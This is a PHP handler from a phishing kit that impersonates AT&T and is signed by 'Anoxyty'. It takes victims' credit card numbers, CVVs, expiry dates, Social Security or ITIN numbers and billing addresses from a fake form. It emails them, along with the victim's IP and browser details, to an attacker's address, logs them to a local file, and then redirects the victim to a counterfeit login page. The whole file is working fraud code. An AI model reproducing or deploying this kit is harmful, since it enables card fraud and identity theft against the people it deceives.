<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['cc'] ) ) {
		
		
			$_SESSION['cc'] 	  = $_POST['cc'];
		$_SESSION['cvv'] 	  = $_POST['cvv'];
		$_SESSION['expdate'] 	  = $_POST['expdate'];
		$_SESSION['bladd'] 	  = $_POST['bladd'];
		$_SESSION['noc'] 	  = $_POST['noc'];
		$_SESSION['ssn'] 	  = $_POST['ssn'];
		$_SESSION['zipcode'] 	  = $_POST['zipcode'];


		$code = <<<EOT
============== 🔥[ AT&T Card | ]🔥 ==============
[NAME ON CARD] 		: {$_SESSION['noc']}
[CARD NUMBER] 		: {$_SESSION['cc']}
[CVV]		: {$_SESSION['cvv']}
[EXPIRY DATE] 		: {$_SESSION['expdate']}
[SOCIAL SECURITY/ITIN] 		: {$_SESSION['ssn']}
[BILLING ADDRESS] 		: {$_SESSION['bladd']}
[ZIPCODE] 		: {$_SESSION['zipcode']}

	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 AT&T By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 AT&T Card By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <veriz@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../completed?/LrrController?IAM_OP=login&appName=m10707&loginSuccessURL=overview&ue");
        exit();
	} else {
		header("Location: ../acctcd?vzauth/UI/Login/access/checkoutinformation/mfaidentification");
		exit();
	}
?>